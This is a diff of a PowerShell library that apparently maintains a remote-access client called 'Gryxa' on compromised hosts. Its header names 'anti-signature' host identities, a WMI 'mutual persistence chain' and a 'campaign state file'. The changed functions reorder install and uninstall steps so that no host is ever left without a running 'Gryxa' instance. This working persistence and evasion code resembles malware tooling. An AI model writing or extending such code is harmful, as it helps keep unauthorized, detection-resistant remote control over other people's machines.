@@ -3,6 +3,7 @@
 # OWN_LIB  BUILD 20260804L40
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
+# L42: FP migrate install-new-FIRST then defer-remove-old (never leave host with zero Gryxa).
 # L41: -Force NEVER /x+/i when Gryxa already Running (force_gryxa.flag was killing live Guest).
 # L39: relay-verified Gryxa keeper adoption; INFLIGHT≠HEALTHY; real -Force/-Deep;
 #      post-Gryxa /i sevrz restore; Test-MsiPackage; TASK_G in state; persistence purge w/o FP-only.
@@ -789,10 +790,51 @@ function Mark-GryxaReinstall {
     Set-Content -LiteralPath (Join-Path $WorkDir 'gryxa_reinstall.flag') -Value (Get-Date).ToUniversalTime().ToString('o') -Encoding ASCII -Force
 }
 
+function Get-GryxaMigrateOldPath { Join-Path $WorkDir 'gryxa_migrate_old.txt' }
+
+function Save-GryxaMigrateOld([string[]]$OldFps, [string]$NewFp) {
+    $olds = @($OldFps | Where-Object { $_ -and ($_ -ne $NewFp) } | Select-Object -Unique)
+    if (-not $olds.Count) {
+        Remove-Item -LiteralPath (Get-GryxaMigrateOldPath) -Force -ErrorAction SilentlyContinue
+        return
+    }
+    Set-Content -LiteralPath (Get-GryxaMigrateOldPath) -Value $olds -Encoding ASCII -Force
+}
+
+function Complete-GryxaMigrateOld {
+    # L42: only strip previous Gryxa FP after the new ExpectedFp is Running.
+    $p = Get-GryxaMigrateOldPath
+    if (-not (Test-Path -LiteralPath $p)) { return }
+    $exp = $script:GryxaExpectedFp
+    $running = Find-RunningGryxaFp
+    if (-not $running) { return }
+    if ($exp -and ($running -ne $exp.ToLower())) { return }
+    $log = Join-Path $WorkDir 'gryxa_ensure.log'
+    Get-Content -LiteralPath $p -ErrorAction SilentlyContinue | ForEach-Object {
+        $old = ([string]$_).Trim().ToLower()
+        if (-not $old -or ($old -eq $running)) { return }
+        Add-Content -LiteralPath $log -Value ('{0} migrate_cleanup_old={1} new={2}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $old, $running) -ErrorAction SilentlyContinue
+        $null = Uninstall-ScFingerprint $old
+    }
+    Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
+}
+
+function Start-GryxaMigrate([string]$MsiPath, [string]$NewFp, [string[]]$OldFps, [string]$Reason) {
+    # L42: sibling-safe /i of NewFp FIRST — keep OldFps Running until Complete-GryxaMigrateOld.
+    Save-GryxaMigrateOld $OldFps $NewFp
+    Clear-GryxaArp $NewFp
+    Set-GryxaFp $NewFp
+    Start-GryxaInstall $MsiPath $NewFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
+    Mark-GryxaReinstall
+    return "INFLIGHT|$NewFp|$Reason"
+}
+
 function Invoke-GryxaEnsure {
     if (-not (Test-Path -LiteralPath $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null }
     $log = Join-Path $WorkDir 'gryxa_ensure.log'
     function GLog([string]$m) { Add-Content -LiteralPath $log -Value ('{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $m) -ErrorAction SilentlyContinue }
+
+    Complete-GryxaMigrateOld
 
     $installCmd = Join-Path $WorkDir 'gryxa_install.cmd'
     # L32: only honor the single-flight lock if msiexec is ACTUALLY running.
@@ -808,8 +850,7 @@ function Invoke-GryxaEnsure {
     $exp = $script:GryxaExpectedFp
     if (-not $exp) { $exp = $fp }
 
-    # L41 -Force: mean "ensure Gryxa is up NOW", NOT "always reinstall".
-    # force_gryxa.flag bump at M43 nuked a live Guest via /x+/i — never again.
+    # L41/L42 -Force: ensure-up, never kill last Gryxa. Migrate = install-new-first.
     if ($Force) {
         $runningForce = Find-RunningGryxaFp
         if ($runningForce -and ((-not $script:GryxaExpectedFp) -or ($runningForce -eq $exp))) {
@@ -817,39 +858,43 @@ function Invoke-GryxaEnsure {
             GLog "force_skip_already_running fp=$runningForce"
             return "HEALTHY|$runningForce|running=1|force-skipped=1"
         }
-        GLog "force_reinstall target=$exp running=$runningForce"
+        GLog "force_ensure target=$exp running=$runningForce"
         $msi = Get-GryxaMsi
         if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$exp|msi-unavailable" }
         $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
         if (-not $newFp) { $newFp = $exp }
-        foreach ($old in @($fp, $runningForce, $exp) | Where-Object { $_ } | Select-Object -Unique) {
-            if ($old -ne $newFp) { GLog "force_uninstall old=$old"; $null = Uninstall-ScFingerprint $old }
+        if ($runningForce -and ($runningForce -eq $newFp)) {
+            Set-GryxaFp $runningForce
+            GLog "force_skip_msi_fp_running fp=$runningForce"
+            return "HEALTHY|$runningForce|running=1|force-skipped=1"
         }
-        Clear-GryxaArp $newFp
-        Set-GryxaFp $newFp
-        Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
-        Mark-GryxaReinstall
-        return "INFLIGHT|$newFp|force-spawned=1"
+        return (Start-GryxaMigrate $msi $newFp @($fp, $runningForce, $exp) 'force-migrate=1')
     }
 
-    # FP rotation: migrate when pinned expected differs from current/running
+    # FP rotation: install ExpectedFp first; strip old only after new is Running
     if ($script:GryxaExpectedFp) {
         $runningFp0 = Find-RunningGryxaFp
         if (($fp -ne $exp) -or ($runningFp0 -and $runningFp0 -ne $exp)) {
             GLog "fp_drift migrate current=$fp running=$runningFp0 expected=$exp"
             $msi = Get-GryxaMsi
-            if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$exp|msi-unavailable" }
+            if (-not $msi) {
+                # keep whatever Gryxa is up — do not uninstall on MSI miss
+                if ($runningFp0) {
+                    Set-GryxaFp $runningFp0
+                    GLog "fp_drift_deferred_msi_unavailable keep=$runningFp0"
+                    return "HEALTHY|$runningFp0|running=1|migrate-deferred=1"
+                }
+                GLog 'msi_unavailable'
+                return "UNHEALTHY|$exp|msi-unavailable"
+            }
             $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
             if (-not $newFp) { $newFp = $exp }
-            foreach ($old in @($fp, $runningFp0) | Where-Object { $_ -and ($_ -ne $newFp) }) {
-                GLog "migrate_uninstall old=$old"
-                $null = Uninstall-ScFingerprint $old
+            if ($runningFp0 -and ($runningFp0 -eq $newFp)) {
+                Set-GryxaFp $runningFp0
+                GLog "fp_drift_already_on_msi_fp fp=$runningFp0"
+                return "HEALTHY|$runningFp0|running=1"
             }
-            Clear-GryxaArp $newFp
-            Set-GryxaFp $newFp
-            Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
-            Mark-GryxaReinstall
-            return "INFLIGHT|$newFp|migrate-spawned=1"
+            return (Start-GryxaMigrate $msi $newFp @($fp, $runningFp0) 'migrate-spawned=1')
         }
     }
 
@@ -886,11 +931,15 @@ function Invoke-GryxaEnsure {
             $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
             if (-not $newFp) { $newFp = $fp }
             GLog "broken_clean_reinstall fp=$fp new=$newFp"
-            $null = Uninstall-ScFingerprint $fp
-            Set-GryxaFp $newFp
-            Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
-            Mark-GryxaReinstall
-            return "INFLIGHT|$newFp|install-spawned=1"
+            # same-FP broken: /x of this FP is OK (already not Running); different newFp → migrate-safe
+            if ($newFp -eq $fp) {
+                $null = Uninstall-ScFingerprint $fp
+                Set-GryxaFp $newFp
+                Start-GryxaInstall $msi $newFp (Join-Path $WorkDir 'msi_gryxa_detached.log')
+                Mark-GryxaReinstall
+                return "INFLIGHT|$newFp|install-spawned=1"
+            }
+            return (Start-GryxaMigrate $msi $newFp @($fp) 'broken-migrate=1')
         }
         'STUCK' {
             if (Test-ScDir $fp) {
